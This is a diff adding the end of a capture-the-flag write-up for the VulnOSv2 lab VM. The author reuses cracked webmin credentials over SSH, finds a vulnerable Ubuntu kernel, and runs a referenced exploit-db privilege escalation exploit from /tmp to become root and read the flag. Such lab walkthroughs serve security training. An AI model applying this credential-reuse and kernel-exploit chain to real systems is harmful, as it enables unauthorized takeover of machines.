@@ -202,3 +202,112 @@ So let's do the cracking in an easy way, throwing the hash into google. It was v
 Let's try to log in the same application again with the credentials webmin/webmin1908. DONE !!! Worked like a charm !!
 
 Now i've noticed that we have a new menu option called "Admin". Cool !!
+
+Checking the "webmin" settings I can see that it's actually a real user, so we can try to SSH into the server with the same credentials.
+
+```
+ssh webmin@192.168.0.15
+The authenticity of host '192.168.0.15 (192.168.0.15)' can't be established.
+ECDSA key fingerprint is ae:d7:6f:cc:ed:4a:82:8b:e8:66:a5:11:7a:11:5f:86.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '192.168.0.15' (ECDSA) to the list of known hosts.
+webmin@192.168.0.15's password: 
+Welcome to Ubuntu 14.04.4 LTS (GNU/Linux 3.13.0-24-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+
+  System information as of Fri May 20 23:23:35 CEST 2016
+
+  System load: 0.0               Memory usage: 3%   Processes:       63
+  Usage of /:  5.7% of 29.91GB   Swap usage:   0%   Users logged in: 0
+
+  Graph this data and manage this system at:
+    https://landscape.canonical.com/
+
+Last login: Wed May  4 10:41:07 2016
+$ whoami
+webmin
+$ id
+uid=1001(webmin) gid=1001(webmin) groups=1001(webmin)
+```
+
+YES !!! Now let's see what kind of privileges we have:
+
+```
+$ whoami
+webmin
+$ id
+uid=1001(webmin) gid=1001(webmin) groups=1001(webmin)
+```
+
+OK, we are just a normal user in the system, but checking out our uname output, we can se we're using an Ubuntu Server with a kernel that's vulnerable to a Local Privilege Escalation exploit:
+
+```
+$ uname -a
+Linux VulnOSv2 3.13.0-24-generic #47-Ubuntu SMP Fri May 2 23:31:42 UTC 2014 i686 i686 i686 GNU/Linux
+```
+
+The exploit can be found here https://www.exploit-db.com/exploits/37292/
+
+Let's check very quickly if we have at least GCC to compile the exploit, once it's a C exploit:
+
+```
+$ which gcc
+/usr/bin/gcc
+```
+
+Yeah, we have GCC, so everything should be ready to go.
+
+Once we don't have write privileges in the directory we are now, we change to /tmp directory and create a file called "exploit.c" to place our exploit.
+
+```
+$ cd /tmp
+$ touch exploit.c
+```
+
+Now we paste the content of the exploit into the exploit.c file and run it. Notice that we were webmin user before, now we are root:
+
+```
+$ whoami
+webmin
+$ ./exploit
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+# whoami
+root
+```
+
+Pwned !!!! Now we are root. The only thing left is to find the flag. Let's list the files in our home directory ~root:
+
+```
+# cd ~root
+# ls -lha
+total 36K
+drwx------  3 root root 4.0K May  4 19:37 .
+drwxr-xr-x 21 root root 4.0K Apr  3 18:06 ..
+-rw-------  1 root root    9 May  4 19:37 .bash_history
+-rw-r--r--  1 root root 3.1K Feb 20  2014 .bashrc
+drwx------  2 root root 4.0K May  2 18:55 .cache
+-rw-r--r--  1 root root  140 Feb 20  2014 .profile
+-rw-------  1 root root    3 May  2 19:01 .psql_history
+-rw-------  1 root root  735 May  4 19:06 .viminfo
+-rw-r--r--  1 root root  165 May  4 19:06 flag.txt
+```
+
+It seems that the flag is there, let's have a look at the "flag.txt" file:
+
+```
+# cat flag.txt
+Hello and welcome.
+You successfully compromised the company "JABC" and the server completely !!
+Congratulations !!!
+Hope you enjoyed it.
+
+What do you think of A.I.?
+```
+
+Voilá !!! There it is, the FLAG !!!!
